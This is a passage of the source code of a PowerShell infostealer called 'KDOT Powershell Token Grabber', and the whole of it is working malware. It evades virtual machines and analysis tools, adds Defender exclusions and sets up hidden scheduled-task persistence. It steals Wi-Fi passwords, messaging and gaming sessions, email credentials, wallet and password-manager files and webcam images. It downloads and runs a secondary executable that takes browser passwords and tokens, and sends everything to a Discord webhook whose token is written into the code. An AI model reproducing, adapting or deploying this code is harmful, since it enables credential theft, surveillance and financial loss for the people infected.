#floppaware
Add-Type -AssemblyName PresentationCore,PresentationFramework

$webhook = "https://discord.com/api/webhooks/1116069524161183744/d1OoBxeXYeRoB3i3VDCB8XAFrERmKw1zM52S7lzLLWdQ6yEwHpKEkVwysID14mS4rqy_"
$debug_mode = $false

function Invoke-Admin_Check {
    $test = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
    return $test
}

function Hide-Console
{
    return 0
    if (-not ("Console.Window" -as [type])) { 
        Add-Type -Name Window -Namespace Console -MemberDefinition '
        [DllImport("Kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
        '
    }
    $consolePtr = [Console.Window]::GetConsoleWindow()
    $null = [Console.Window]::ShowWindow($consolePtr, 0)
}

function Invoke-ANTITOTAL {
    $urls = @(
        "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/mac_list.txt",
        "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/ip_list.txt",
        "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/hwid_list.txt",
        "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_username_list.txt"
    )
    $functions = @(
        "Search-Mac",
        "Search-IP",
        "Search-HWID",
        "Search-Username"
    )
    
    for ($i = 0; $i -lt $urls.Count; $i++) {
        $url = $urls[$i]
        $functionName = $functions[$i]
        
        $result = Invoke-WebRequest -Uri $url
        if ($result.StatusCode -eq 200) {
            $content = $result.Content
            $function = Get-Command -Name $functionName
            $output = & $function.Name $content
            
            if ($output -eq $true) {
                make_error_page "Detected VM"
                Start-Sleep -s 3
                exit
            }
        }
        else {
            make_error_page "Failed to retrieve content from URL: $url"
            exit
        }
    }
    Anti_vm
}

function Anti_vm {
    ram_check
    $processnames= @(
            "autoruns",
            "autorunsc",
            "dumpcap",
            "fiddler",
            "fakenet",
            "hookexplorer",
            "immunitydebugger",
            "httpdebugger",
            "importrec",
            "lordpe",
            "petools",
            "processhacker",
            "resourcehacker",
            "scylla_x64",
            "sandman",
            "sysinspector",
            "tcpview",
            "die",
            "dumpcap",
            "filemon",
            "idaq",
            "idaq64",
            "joeboxcontrol",
            "joeboxserver",
            "ollydbg",
            "proc_analyzer",
            "procexp",
            "procmon",
            "pestudio",
            "qemu-ga",
            "qga",
            "regmon",
            "sniff_hit",
            "sysanalyzer",
            "tcpview",
            "windbg",
            "wireshark",
            "x32dbg",
            "x64dbg",
            "vmwareuser",
            "vmacthlp",
            "vboxservice",
            "vboxtray",
            "xenservice"
        )
    $detectedProcesses = $processnames | ForEach-Object {
        $processName = $_
        if (Get-Process -Name $processName -ErrorAction SilentlyContinue) {
            $processName | Out-Null
        }
    }

    if ($null -eq $detectedProcesses) { 
        Invoke-TASKS
    }
    else { 
        Write-Output "Detected processes: $($detectedProcesses -join ', ')"
        Foreach ($process in $detectedProcesses) {
            Stop-Process -Name $process -Force | Out-Null
        }
    }
}

function make_error_page {
    param(
        [Parameter(Mandatory=$true)]
        [string]$error_message
    )
    $null = [System.Windows.MessageBox]::Show("$error_message","ERROR",0,16)
}

function ram_check {
    $ram = Get-WmiObject -Class Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % {[Math]::Round(($_.Sum / 1GB),2)}
    if ($ram -lt 6) {
        make_error_page "RAM CHECK FAILED"
        Start-Sleep -s 3
        exit
    }
}

function Invoke-TASKS {
    Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp"
    Add-MpPreference -ExclusionPath "$env:APPDATA\KDOT"
    New-Item -ItemType Directory -Path "$env:APPDATA\KDOT" -Force
    # Hidden Directory
    $KDOT_DIR=get-item "$env:APPDATA\KDOT" -Force
    $KDOT_DIR.attributes="Hidden","System" 
    $origin = $PSCommandPath
    Copy-Item -Path $origin -Destination "$env:APPDATA\KDOT\KDOT.ps1" -Force
    $task_name = "KDOT"
    $task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument 'vbscript:createobject("wscript.shell").run("PowerShell.exe -ExecutionPolicy Bypass -File %appdata%\kdot\kdot.ps1",0)(window.close)'
    $task_trigger = New-ScheduledTaskTrigger -AtLogOn
    $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
    Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "KDOT" -RunLevel Highest -Force
    EXFILTRATE-DATA
}

function Request-Admin {
    while(!(Invoke-Admin_Check)) {
        try {
            if ($debug_mode) {
                Start-Process "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
            } else {
                Start-Process "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle hidden -File `"$PSCommandPath`"" -Verb RunAs
            }
            exit
        }
        catch {}
    }
}

function EXFILTRATE-DATA {
    $folder_general = "$env:APPDATA\KDOT\DATA"
    $folder_messaging = "$env:APPDATA\KDOT\DATA\Messaging"
    $folder_gaming = "$env:APPDATA\KDOT\DATA\Gaming"
    $folder_crypto = "$env:APPDATA\KDOT\DATA\Crypto"
    $folder_email = "$env:APPDATA\KDOT\DATA\Email"
    $folder_clients = "$env:APPDATA\KDOT\DATA\Clients"
    $important_files = "$env:APPDATA\KDOT\DATA\important_files"

    New-Item -ItemType Directory -Path $folder_general -Force
    New-Item -ItemType Directory -Path $folder_messaging -Force
    New-Item -ItemType Directory -Path $folder_gaming -Force
    New-Item -ItemType Directory -Path $folder_crypto -Force
    New-Item -ItemType Directory -Path $folder_email -Force
    New-Item -ItemType Directory -Path $folder_clients -Force
    New-Item -ItemType Directory -Path $important_files -Force

    #bulk data
    $ip = Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing
    $ip = $ip.Content
    $ip > $folder_general\ip.txt
    $lang = (Get-WinUserLanguageList).LocalizedName
    $date = (get-date).toString("r")
    Get-ComputerInfo > $folder_general\system_info.txt
    $osversion = (Get-WmiObject -class Win32_OperatingSystem).Caption
    $osbuild = (Get-ItemProperty -Path c:\windows\system32\hal.dll).VersionInfo.FileVersion
    $displayversion = (Get-Item "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion").GetValue('DisplayVersion')
    $model = (Get-WmiObject -Class:Win32_ComputerSystem).Model
    $uuid = Get-WmiObject -Class Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID 
    $uuid > $folder_general\uuid.txt
    $cpu = Get-WmiObject -Class Win32_Processor | Select-Object -ExpandProperty Name
    $cpu > $folder_general\cpu.txt
    $gpu = (Get-WmiObject Win32_VideoController).Name 
    $gpu > $folder_general\GPU.txt
    $format = " GB"
    $total = Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | Foreach {"{0:N2}" -f ([math]::round(($_.Sum / 1GB),2))}
    $raminfo = "$total" + "$format"  
    $mac = (Get-WmiObject win32_networkadapterconfiguration -ComputerName $env:COMPUTERNAME | Where{$_.IpEnabled -Match "True"} | Select-Object -Expand macaddress) -join ","
    $mac > $folder_general\mac.txt
    $username = $env:USERNAME
    $hostname = $env:COMPUTERNAME
    netstat -ano > $folder_general\netstat.txt
    $mfg = (gwmi win32_computersystem).Manufacturer
    #end of bulk data

    $uptime = Get-Uptime
    $avlist = get-installed-av -autosize | ft | out-string

    $wifipasslist = netsh wlan show profiles | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | out-string
    $wifi = $wifipasslist | out-string 
    $wifi > $folder_general\WIFIPasswords.txt

    $width = (((Get-WmiObject -Class Win32_VideoController).VideoModeDescription  -split '\n')[0]  -split ' ')[0]
    $height = (((Get-WmiObject -Class Win32_VideoController).VideoModeDescription  -split '\n')[0]  -split ' ')[2]  
    $split = "x"
    $screen = "$width" + "$split" + "$height"

    #misc data
    Get-CimInstance Win32_StartupCommand | Select-Object Name, command, Location, User | Format-List > $folder_general\StartUpApps.txt
    Get-WmiObject win32_service |? State -match "running" | select Name, DisplayName, PathName, User | sort Name | ft -wrap -autosize >  $folder_general\running-services.txt
    Get-WmiObject win32_process | Select-Object Name,Description,ProcessId,ThreadCount,Handles,Path | ft -wrap -autosize > $folder_general\running-applications.txt
    Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table > $folder_general\Installed-Applications.txt
    Get-NetAdapter | ft Name,InterfaceDescription,PhysicalMediaType,NdisPhysicalMedium -AutoSize > $folder_general\NetworkAdapters.txt

    #messaging
    Invoke-telegramstealer
    Invoke-elementstealer
    Invoke-icqstealer
    Invoke-signalstealer
    Invoke-viberstealer
    Invoke-whatsappstealer

    #games
    Invoke-steamstealer
    Invoke-minecraftstealer
    Invoke-epicgames_stealer
    Invoke-ubisoftstealer
    Invoke-electronic_arts

    #vpn
    Invoke-protonvpnstealer
    Invoke-surfsharkvpnstealer

    #other stuff

    $alldiskinfo = diskdata | ft -wrap -autosize
    $alldiskinfo > $folder_general\diskinfo.txt

    Get-ProductKey > $folder_general\productkey.txt

    # Thunderbird Exfil
    If (Test-Path -Path "$env:USERPROFILE\AppData\Roaming\Thunderbird\Profiles") {
        $Thunderbird = @('key4.db', 'key3.db', 'logins.json', 'cert9.db')
        New-Item -Path "$folder_email\Thunderbird" -ItemType Directory | Out-Null
        Get-ChildItem "$env:USERPROFILE\AppData\Roaming\Thunderbird\Profiles" -Include $Thunderbird -Recurse | Copy-Item -Destination "$emailclientsfolder\Thunderbird" -Recurse -Force
    }

    Invoke-Crypto_Wallets
    Invoke-GrabFiles

    $embed_and_body = @{
        "username" = "KDOT"
        "content" = "@everyone"
        "title" = "KDOT"
        "description" = "Powerful Token Grabber"
        "color" = "16711680"
        "avatar_url" = "https://i.postimg.cc/k58gQ03t/PTG.gif"
        "url" = "https://discord.gg/vk3rBhcj2y"
        "embeds" = @(
            @{
                "title" = "POWERSHELL GRABBER"
                "url" = "https://github.com/KDot227/Powershell-Token-Grabber/tree/main"
                "description" = "New victim info collected !"
                "color" = "16711680"
                "footer" = @{
                    "text" = "Made by KDOT, GODFATHER and CHAINSKI"
                }
                "thumbnail" = @{
                    "url" = "https://i.postimg.cc/k58gQ03t/PTG.gif"
                }
                "fields" = @(
                    @{
                        "name" = ":satellite: IP"
                        "value" = "``````$ip``````"
                    },
                    @{
                        "name" = ":bust_in_silhouette: User Information"
                        "value" = "``````Date: $date `nLanguage: $lang `nUsername: $username `nHostname: $hostname``````"
                    },
                    @{
                        "name" = ":shield: Antivirus"
                        "value" = "``````$avlist``````"
                    },
                    @{
                        "name" = ":computer: Hardware"
                        "value" = "``````Screen Size: $screen `nOS: $osversion `nOS Build: $osbuild `nOS Version: $displayversion `nManufacturer: $mfg `nModel: $model `nCPU: $cpu `nGPU: $gpu `nRAM: $raminfo `nHWID: $uuid `nMAC: $mac `nUptime: $uptime``````"
                    },
                    @{
                        "name" = ":floppy_disk: Disk"
                        "value" = "``````$alldiskinfo``````"
                    }
                    @{
                        "name" = ":signal_strength: WiFi"
                        "value" = "``````$wifi``````"
                    }
                )
            }
        )
    }

    $payload = $embed_and_body | ConvertTo-Json -Depth 10
    Invoke-WebRequest -Uri $webhook -Method POST -Body $payload -ContentType "application/json" -UseBasicParsing | Out-Null

    Get-WebCamImage

    curl.exe -F "payload_json={\`"username\`": \`"KDOT\`", \`"content\`": \`":hamsa: **Screenshot**\`"}" -F "file=@\`"$folder_general\desktop-screenshot.png\`"" $webhook | out-null

    $items = Get-ChildItem -Path $env:localappdata\temp\ -Filter out*.jpg
    foreach ($item in $items) {
        $name = $item.Name
        curl.exe -F "payload_json={\`"username\`": \`"KDOT\`", \`"content\`": \`":hamsa: **webcam**\`"}" -F "file=@\`"$env:localappdata\temp\$name\`"" $webhook | out-null
        Remove-Item -Path $env:localappdata\temp\$name -Force
    }

    $token_prot = Test-Path "$env:APPDATA\DiscordTokenProtector\DiscordTokenProtector.exe"
    if ($token_prot -eq $true) {
        Stop-Process -Name DiscordTokenProtector -Force
        Remove-Item "$env:APPDATA\DiscordTokenProtector\DiscordTokenProtector.exe" -Force
    }

    $secure_dat = Test-Path "$env:APPDATA\DiscordTokenProtector\secure.dat"
    if ($secure_dat -eq $true) {
        Remove-Item "$env:APPDATA\DiscordTokenProtector\secure.dat" -Force
    }

    try {
        Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'Discord' -Force -ErrorAction SilentlyContinue | Out-Null
    } catch {}

    (New-Object System.Net.WebClient).DownloadFile("https://github.com/KDot227/Powershell-Token-Grabber/releases/download/V4.2/main.exe", "$env:LOCALAPPDATA\Temp\main.exe")

    Stop-Process -Name discord -Force -ErrorAction SilentlyContinue | Out-Null
    Stop-Process -Name discordcanary -Force -ErrorAction SilentlyContinue | Out-Null
    Stop-Process -Name discordptb -Force -ErrorAction SilentlyContinue | Out-Null

    Set-Location "$env:LOCALAPPDATA\Temp"

    $proc = Start-Process $env:LOCALAPPDATA\Temp\main.exe -ArgumentList "$webhook" -NoNewWindow -PassThru
    $proc.WaitForExit()

    $main_temp = "$env:LOCALAPPDATA\Temp\"

    Move-Item "$main_temp\browser-cookies.txt" $folder_general -Force
    Move-Item "$main_temp\browser-history.txt" $folder_general -Force
    Move-Item "$main_temp\browser-passwords.txt" $folder_general -Force
    Move-Item "$main_temp\tokens.txt" $folder_general -Force

    #remove empty dirs
    do {
        $dirs = gci $folder_general -directory -recurse | Where { (gci $_.fullName).count -eq 0 } | select -expandproperty FullName
        $dirs | Foreach-Object { Remove-Item $_ }
    } while ($dirs.count -gt 0)

    Compress-Archive -Path "$folder_general" -DestinationPath "$env:LOCALAPPDATA\Temp\KDOT.zip" -Force
    curl.exe -X POST -F 'payload_json={\"username\": \"KDOT\", \"content\": \"\", \"avatar_url\": \"https://i.postimg.cc/k58gQ03t/PTG.gif\"}' -F "file=@$env:LOCALAPPDATA\Temp\KDOT.zip" $webhook

    Remove-Item "$env:LOCALAPPDATA\Temp\KDOT.zip" -Force
    Remove-Item "$folder_general" -Force -Recurse
    Remove-Item "$main_temp\main.exe" -Force
}


function Get-WebCamImage {
    # made by https://github.com/stefanstranger/PowerShell/blob/master/Get-WebCamp.ps1
    # he did 99% of the work
    # other 1% modified by KDot227
    # had to half learn c# to figure anything out (I still don't understand it)
    $source=@" 
    using System; 
    using System.Collections.Generic; 
    using System.Text; 
    using System.Collections; 
    using System.Runtime.InteropServices; 
    using System.ComponentModel; 
    using System.Data; 
    using System.Drawing; 
    using System.Windows.Forms; 
    
    namespace WebCamLib 
    { 
        public class Device 
        { 
            private const short WM_CAP = 0x400; 
            private const int WM_CAP_DRIVER_CONNECT = 0x40a; 
            private const int WM_CAP_DRIVER_DISCONNECT = 0x40b; 
            private const int WM_CAP_EDIT_COPY = 0x41e; 
            private const int WM_CAP_SET_PREVIEW = 0x432; 
            private const int WM_CAP_SET_OVERLAY = 0x433; 
            private const int WM_CAP_SET_PREVIEWRATE = 0x434; 
            private const int WM_CAP_SET_SCALE = 0x435; 
            private const int WS_CHILD = 0x40000000; 
            private const int WS_VISIBLE = 0x10000000; 
    
            [DllImport("avicap32.dll")] 
            protected static extern int capCreateCaptureWindowA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszWindowName, 
                int dwStyle, int x, int y, int nWidth, int nHeight, int hWndParent, int nID); 
    
            [DllImport("user32", EntryPoint = "SendMessageA")] 
            protected static extern int SendMessage(int hwnd, int wMsg, int wParam, [MarshalAs(UnmanagedType.AsAny)] object lParam); 
    
            [DllImport("user32")] 
            protected static extern int SetWindowPos(int hwnd, int hWndInsertAfter, int x, int y, int cx, int cy, int wFlags); 
    
            [DllImport("user32")] 
            protected static extern bool DestroyWindow(int hwnd); 
                    
            int index; 
            int deviceHandle; 
    
            public Device(int index) 
            { 
                this.index = index; 
            } 
    
            private string _name; 
    
            public string Name 
            { 
                get { return _name; } 
                set { _name = value; } 
            } 
    
            private string _version; 
    
            public string Version 
            { 
                get { return _version; } 
                set { _version = value; } 
            } 
    
            public override string ToString() 
            { 
                return this.Name; 
            } 
    
            public void Init(int windowHeight, int windowWidth, int handle) 
            { 
                string deviceIndex = Convert.ToString(this.index); 
                deviceHandle = capCreateCaptureWindowA(ref deviceIndex, WS_VISIBLE | WS_CHILD, 0, 0, windowWidth, windowHeight, handle, 0); 
    
                if (SendMessage(deviceHandle, WM_CAP_DRIVER_CONNECT, this.index, 0) > 0) 
                { 
                    SendMessage(deviceHandle, WM_CAP_SET_SCALE, -1, 0); 
                    SendMessage(deviceHandle, WM_CAP_SET_PREVIEWRATE, 0x42, 0); 
                    SendMessage(deviceHandle, WM_CAP_SET_PREVIEW, -1, 0); 
                    SetWindowPos(deviceHandle, 1, 0, 0, windowWidth, windowHeight, 6); 
                } 
            } 
    
            public void ShowWindow(global::System.Windows.Forms.Control windowsControl) 
            { 
                Init(windowsControl.Height, windowsControl.Width, windowsControl.Handle.ToInt32());                         
            } 
            
            public void CopyC() 
            { 
                SendMessage(this.deviceHandle, WM_CAP_EDIT_COPY, 0, 0);          
            } 
    
            public void Stop() 
            { 
                SendMessage(deviceHandle, WM_CAP_DRIVER_DISCONNECT, this.index, 0); 
                DestroyWindow(deviceHandle); 
            } 
        } 
        
        public class DeviceManager 
        { 
            [DllImport("avicap32.dll")] 
            protected static extern bool capGetDriverDescriptionA(short wDriverIndex, 
                [MarshalAs(UnmanagedType.VBByRefStr)]ref String lpszName, 
            int cbName, [MarshalAs(UnmanagedType.VBByRefStr)] ref String lpszVer, int cbVer); 
    
            static ArrayList devices = new ArrayList(); 
    
            public static Device[] GetAllDevices() 
            { 
                String dName = "".PadRight(100); 
                String dVersion = "".PadRight(100); 
    
                for (short i = 0; i < 10; i++) 
                { 
                    if (capGetDriverDescriptionA(i, ref dName, 100, ref dVersion, 100)) 
                    { 
                        Device d = new Device(i); 
                        d.Name = dName.Trim(); 
                        d.Version = dVersion.Trim(); 
                        devices.Add(d);                     
                    } 
                } 
    
                return (Device[])devices.ToArray(typeof(Device)); 
            } 
    
            public static Device GetDevice(int deviceIndex) 
            { 
                return (Device)devices[deviceIndex]; 
            } 
        } 
    } 
"@ 
    Add-Type -AssemblyName System.Drawing  
    $jpegCodec = [Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() |   
    Where-Object { $_.FormatDescription -eq "JPEG" }       
    Add-Type -TypeDefinition $source -ReferencedAssemblies System.Windows.Forms, System.Data, System.Drawing  | Out-Null
    try {
        #region Import the Assemblies 
        [reflection.assembly]::loadwithpartialname("System.Windows.Forms") | Out-Null 
        [reflection.assembly]::loadwithpartialname("System.Drawing") | Out-Null 
        #endregion 
        $picCapture = New-Object System.Windows.Forms.PictureBox 
        try {
            $devices = [WebCamLib.DeviceManager]::GetAllDevices()
        } catch {
            Write-Host "No camera found"
            exit
        }
        $count = 0
        foreach ($device in $devices) {
            $imagePath = "$env:localappdata\temp\out$count.jpg"
            $device.ShowWindow($picCapture)
            $device.CopyC()
            $bitmap = [Windows.Forms.Clipboard]::GetImage()
            $bitmap.Save($imagePath, $jpegCodec, $ep)
            $bitmap.dispose()
            $count++
            [Windows.Forms.Clipboard]::Clear()
        }

    } catch {
            Write-Host "No camera found"
            exit
        }
}

Function Invoke-GrabFiles {
    $grabber = @(
        "2fa",
        "acc",
        "account",
        "backup",
        "backupcode",
        "bitwarden",
        "code",
        "coinbase",
        "crypto",
        "dashlane",
        "default",
        "discord",
        "disk",
        "eth",
        "exodus",
        "facebook",
        "fb",
        "keepass",
        "keepassxc",
        "keys",
        "lastpass",
        "login",
        "mail",
        "memo",
        "metamask",
        "nordpass",
        "pass",
        "paypal",
        "private",
        "pw",
        "recovery",
        "remote",
        "secret",
        "seedphrase",
        "wallet seed",
        "server",
        "syncthing",
        "token",
        "wal",
        "wallet"
    )
    $dest = $important_files
    $paths = "$env:userprofile\Downloads", "$env:userprofile\Documents", "$env:userprofile\Desktop"
    [regex] $grab_regex = "(" + (($grabber |foreach {[regex]::escape($_)}) -join "|") + ")"
    (gci -path $paths -Include "*.pdf","*.txt","*.doc","*.csv","*.rtf","*.docx" -r | ? Length -lt 5mb) -match $grab_regex | Copy-Item -Destination $dest -Force
}

function Get-ProductKey {
    try {
        $regPath = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform'
        $keyName = 'BackupProductKeyDefault'
        $backupProductKey = Get-ItemPropertyValue -Path $regPath -Name $keyName
        return $backupProductKey
    } catch {
        return "No product key found"
    }
}

function diskdata {
    $disks = get-wmiobject -class "Win32_LogicalDisk" -namespace "root\CIMV2"
    $results = foreach ($disk in $disks) {
        if ($disk.Size -gt 0) {
            $SizeOfDisk = [math]::round($disk.Size/1GB, 0)
            $FreeSpace = [math]::round($disk.FreeSpace/1GB, 0)
            $usedspace = [math]::round(($disk.size - $disk.freespace) / 1GB, 2)
            [int]$FreePercent = ($FreeSpace/$SizeOfDisk) * 100
            [int]$usedpercent = ($usedspace/$SizeOfDisk) * 100
            [PSCustomObject]@{
                Drive = $disk.Name
                Name = $disk.VolumeName
                "Total Disk Size" = "{0:N0} GB" -f $SizeOfDisk 
                "Free Disk Size" = "{0:N0} GB ({1:N0} %)" -f $FreeSpace, ($FreePercent)
                "Used Space" = "{0:N0} GB ({1:N0} %)" -f $usedspace, ($usedpercent)
            }
        }
    }
    $results | out-string 
}

function Get-Uptime {
    $ts = (Get-Date) - (Get-CimInstance -ClassName Win32_OperatingSystem -ComputerName $computername).LastBootUpTime
    $uptimedata = '{0} days {1} hours {2} minutes {3} seconds' -f $ts.Days, $ts.Hours, $ts.Minutes, $ts.Seconds
    $uptimedata
}

function get-installed-av {
    $wmiQuery = "SELECT * FROM AntiVirusProduct"
    $AntivirusProduct = Get-WmiObject -Namespace "root\SecurityCenter2" -Query $wmiQuery  @psboundparameters 
    $AntivirusProduct.displayName 
}

function Invoke-telegramstealer {
    $path = "$env:userprofile\AppData\Roaming\Telegram Desktop\tdata"
    if (!(Test-Path $path)) {return}
    $processname = "telegram"
    try {if (Get-Process $processname -ErrorAction SilentlyContinue ) {Get-Process -Name $processname | Stop-Process }} catch {}
    $destination = "$folder_messaging\Telegram.zip"
    $exclude = @("_*.config","dumps","tdummy","emoji","user_data","user_data#2","user_data#3","user_data#4","user_data#5","user_data#6","*.json","webview")
    $files = Get-ChildItem -Path $path -Exclude $exclude
    Compress-Archive -Path $files -DestinationPath $destination -CompressionLevel Fastest -Force
}

function Invoke-elementstealer {
    $elementfolder = "$env:userprofile\AppData\Roaming\Element"
    if (!(Test-Path $elementfolder)) {return}
    $processname = "element"
    try {if (Get-Process $processname -ErrorAction SilentlyContinue ) {Get-Process -Name $processname | Stop-Process }} catch {}
    $element_session = "$folder_messaging\Element"
    New-Item -ItemType Directory -Force -Path $element_session
    Copy-Item -Path "$elementfolder\databases" -Destination $element_session -Recurse -force
    Copy-Item -Path "$elementfolder\Local Storage" -Destination $element_session -Recurse -force
    Copy-Item -Path "$elementfolder\Session Storage" -Destination $element_session -Recurse -force
    Copy-Item -Path "$elementfolder\IndexedDB" -Destination $element_session -Recurse -force
    Copy-Item -Path "$elementfolder\sso-sessions.json" -Destination $element_session -Recurse -force
}

function Invoke-icqstealer {
    $icqfolder = "$env:userprofile\AppData\Roaming\ICQ"
    if (!(Test-Path $icqfolder)) {return}
    $processname = "icq"
    try {if (Get-Process $processname -ErrorAction SilentlyContinue ) {Get-Process -Name $processname | Stop-Process }} catch {}
    $icq_session = "$folder_messaging\ICQ"
    New-Item -ItemType Directory -Force -Path $icq_session
    Copy-Item -Path "$icqfolder\0001" -Destination $icq_session -Recurse -force
}

function Invoke-signalstealer {
    $signalfolder = "$env:userprofile\AppData\Roaming\Signal"
    if (!(Test-Path $signalfolder)) {return}
    $processname = "signal"
    try {if (Get-Process $processname -ErrorAction SilentlyContinue ) {Get-Process -Name $processname | Stop-Process }} catch {}
    $signal_session = "$folder_messaging\Signal"
    New-Item -ItemType Directory -Force -Path $signal_session
    Copy-Item -Path "$signalfolder\databases" -Destination $signal_session -Recurse -force
    Copy-Item -Path "$signalfolder\Local Storage" -Destination $signal_session -Recurse -force
    Copy-Item -Path "$signalfolder\Session Storage" -Destination $signal_session -Recurse -force
    Copy-Item -Path "$signalfolder\sql" -Destination $signal_session -Recurse -force
    Copy-Item -Path "$signalfolder\config.json" -Destination $signal_session -Recurse -force
}

function Invoke-viberstealer {
    $viberfolder = "$env:userprofile\AppData\Roaming\ViberPC"
    if (!(Test-Path $viberfolder)) {return}
    $processname = "viber"
    try {if (Get-Process $processname -ErrorAction SilentlyContinue ) {Get-Process -Name $processname | Stop-Process }} catch {}
    $viber_session = "$folder_messaging\Viber"
    New-Item -ItemType Directory -Force -Path $viber_session
    $configfiles = @("config$1")
    foreach($file in $configfiles) {
        Get-ChildItem -path $viberfolder -Filter ([regex]::escape($file) + "*") -Recurse -File | ForEach { Copy-Item -path $PSItem.FullName -Destination $viber_session }
    }
    $pattern = "^([\+|0-9 ][ 0-9.]{1,12})$"
    $directories = Get-ChildItem -Path $viberFolder -Directory | Where-Object { $_.Name -match $pattern }
    foreach ($directory in $directories) {
        $destinationPath = Join-Path -Path $viber_session -ChildPath $directory.Name
        Copy-Item -Path $directory.FullName -Destination $destinationPath -Force
    }
    $files = Get-ChildItem -Path $viberFolder -File -Recurse -Include "*.db", "*.db-shm", "*.db-wal" | Where-Object { -not $_.PSIsContainer }
        foreach ($file in $files) {
            $parentFolder = Split-Path -Path $file.FullName -Parent
            $phoneNumberFolder = Get-ChildItem -Path $parentFolder -Directory | Where-Object { $_.Name -match $pattern}
            if (-not $phoneNumberFolder) {
                Copy-Item -Path $file.FullName -Destination $destinationPath
        }
    }
}

function Invoke-whatsappstealer {
    $processname = "whatsapp"
    try {if (Get-Process $processname -ErrorAction SilentlyContinue ) {Get-Process -Name $processname | Stop-Process }} catch {}
    $whatsapp_session = "$folder_messaging\Whatsapp"
    New-Item -ItemType Directory -Force -Path $whatsapp_session
    $regexPattern = "WhatsAppDesktop"
    $parentFolder = Get-ChildItem -Path "$env:localappdata\Packages" -Directory | Where-Object { $_.Name -match $regexPattern }
    if ($parentFolder){
        $localStateFolder = Get-ChildItem -Path $parentFolder.FullName -Filter "LocalState" -Recurse -Directory
        if ($localStateFolder) {
            $destinationPath = Join-Path -Path $whatsapp_session -ChildPath $localStateFolder.Name
            Copy-Item -Path $localStateFolder.FullName -Destination $destinationPath -Recurse
        }
    }
}

function Invoke-steamstealer {
    $steamfolder = ("${Env:ProgramFiles(x86)}\Steam")
    if (!(Test-Path $steamfolder)) {return}
    $processname = "steam"
    try {if (Get-Process $processname -ErrorAction SilentlyContinue ) {Get-Process -Name $processname | Stop-Process }} catch {}
    $steam_session = "$folder_gaming\Steam"
    New-Item -ItemType Directory -Force -Path $steam_session
    Copy-Item -Path "$steamfolder\config" -Destination $steam_session -Recurse -force
    $ssfnfiles = @("ssfn$1")
    foreach($file in $ssfnfiles) {
        Get-ChildItem -path $steamfolder -Filter ([regex]::escape($file) + "*") -Recurse -File | ForEach { Copy-Item -path $PSItem.FullName -Destination $steam_session }
    }
}

function Invoke-minecraftstealer {
    $minecraftfolder1 = $env:appdata + "\.minecraft"
    $minecraftfolder2 = $env:userprofile + "\.lunarclient\settings\game"
    if (!(Test-Path $minecraftfolder1) -or !(Test-Path $minecraftfolder2)) {return}
    $minecraft_session = "$folder_gaming\Minecraft"
    New-Item -ItemType Directory -Force -Path $minecraft_session
    Get-ChildItem $minecraftfolder1 -Include "*.json" -Recurse | Copy-Item -Destination $minecraft_session
    Get-ChildItem $minecraftfolder2 -Include "*.json" -Recurse | Copy-Item -Destination $minecraft_session
}

# Epicgames Session Stealer
function Invoke-epicgames_stealer {
    $epicgamesfolder = "$env:localappdata\EpicGamesLauncher"
    if (!(Test-Path $epicgamesfolder)) {return}
    $processname = "epicgameslauncher"
    try {if (Get-Process $processname -ErrorAction SilentlyContinue ) {Get-Process -Name $processname | Stop-Process }} catch {}
    $epicgames_session = "$folder_gaming\EpicGames"
    New-Item -ItemType Directory -Force -Path $epicgames_session
    Copy-Item -Path "$epicgamesfolder\Saved\Config" -Destination $epicgames_session -Recurse -force
    Copy-Item -Path "$epicgamesfolder\Saved\Logs" -Destination $epicgames_session -Recurse -force
    Copy-Item -Path "$epicgamesfolder\Saved\Data" -Destination $epicgames_session -Recurse -force
}

# Ubisoft Session Stealer
function Invoke-ubisoftstealer {
    $ubisoftfolder = "$env:localappdata\Ubisoft Game Launcher"
    if (!(Test-Path $ubisoftfolder)) {return}
    $processname = "upc"
    try {if (Get-Process $processname -ErrorAction SilentlyContinue ) {Get-Process -Name $processname | Stop-Process }} catch {}
    $ubisoft_session = "$folder_gaming\Ubisoft"
    New-Item -ItemType Directory -Force -Path $ubisoft_session
    Copy-Item -Path "$ubisoftfolder" -Destination $ubisoft_session -Recurse -force
}

# EA Session Stealer
function Invoke-electronic_arts {
    $eafolder = "$env:localappdata\Electronic Arts"
    if (!(Test-Path $eafolder)) {return}
    $processname = "eadesktop"
    try {if (Get-Process $processname -ErrorAction SilentlyContinue ) {Get-Process -Name $processname | Stop-Process }} catch {}
    $ea_session = "$folder_gaming\Electronic Arts"
